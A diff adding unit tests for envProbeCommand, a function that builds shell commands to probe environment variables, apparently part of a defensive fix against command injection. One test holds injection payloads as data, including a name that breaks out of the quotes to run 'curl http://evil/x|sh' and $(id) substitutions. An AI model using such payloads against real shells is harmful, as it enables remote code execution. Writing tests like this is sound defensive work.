@@ -29,3 +29,26 @@ test('an unknown shell falls back by platform', () => {
   assert.equal(envProbeCommand(undefined, 'A', 'win32'), 'echo "A=$env:A"');
   assert.equal(envProbeCommand(undefined, 'A', 'linux'), 'echo "A=$A"');
 });
+
+test('a binding name that is not a name produces no line at all', () => {
+  // envBindings is plaintext metadata that SYNCS, and the probe is typed into a
+  // terminal with Enter pressed — so a name nobody checked is a command. The form
+  // validated it and nothing else did, which is the wrong way round: the form is
+  // the one source that was never hostile.
+  for (const shell of ['/bin/bash', 'C:\Windows\System32\cmd.exe', 'pwsh']) {
+    assert.equal(envProbeCommand(shell, 'A"; curl http://evil/x|sh #'), '');
+    assert.equal(envProbeCommand(shell, 'A$(id)'), '');
+    assert.equal(envProbeCommand(shell, 'A`id`'), '');
+    assert.equal(envProbeCommand(shell, 'A B'), '');
+  }
+});
+
+test('an ordinary binding name still probes in every shell', () => {
+  assert.match(envProbeCommand('/bin/bash', 'ENV_PROD_PASSWORD'), /ENV_PROD_PASSWORD/);
+  // includes() rather than a regex: the interesting character is an anchor in one.
+  assert.equal(
+    envProbeCommand('pwsh', 'ENV_PROD_PASSWORD').includes('$env:ENV_PROD_PASSWORD'),
+    true,
+  );
+  assert.match(envProbeCommand('cmd.exe', 'ENV_PROD_PASSWORD'), /%ENV_PROD_PASSWORD%/);
+});
